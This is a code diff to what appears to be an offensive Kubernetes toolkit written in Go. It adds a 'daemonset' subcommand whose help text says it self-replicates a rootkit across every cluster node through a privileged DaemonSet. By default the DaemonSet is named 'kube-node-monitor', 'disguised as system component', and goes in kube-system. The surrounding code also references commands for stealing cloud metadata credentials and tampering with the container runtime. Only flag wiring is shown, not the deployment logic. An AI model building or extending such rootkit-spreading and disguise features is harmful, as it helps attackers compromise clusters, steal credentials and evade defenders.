@@ -190,6 +190,13 @@ var cmdCRITamper = &cobra.Command{
 	RunE:  criTamperCmd,
 }
 
+var cmdDaemonSet = &cobra.Command{
+	Use:   "daemonset",
+	Short: "DaemonSet dropper",
+	Long:  "daemonset self-replicates the rootkit across all cluster nodes via a privileged DaemonSet",
+	RunE:  daemonSetCmd,
+}
+
 var cmdCloudMeta = &cobra.Command{
 	Use:   "meta",
 	Short: "steal cloud metadata credentials",
@@ -686,4 +693,32 @@ func init() {
 		"",
 		"output file path (stdout if not set)")
 	KUBEDaggerClient.AddCommand(cmdCRITamper)
+
+	cmdDaemonSet.PersistentFlags().StringVar(
+		&options.DaemonSetAction,
+		"action",
+		"deploy",
+		"daemonset action: deploy, remove, or status")
+	cmdDaemonSet.PersistentFlags().StringVar(
+		&options.DaemonSetImage,
+		"image",
+		"",
+		"container image for the DaemonSet pods")
+	cmdDaemonSet.PersistentFlags().StringVar(
+		&options.DaemonSetName,
+		"name",
+		"kube-node-monitor",
+		"DaemonSet name (disguised as system component)")
+	cmdDaemonSet.PersistentFlags().StringVar(
+		&options.K8sNamespace,
+		"namespace",
+		"kube-system",
+		"namespace to deploy the DaemonSet in")
+	cmdDaemonSet.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdDaemonSet)
 }
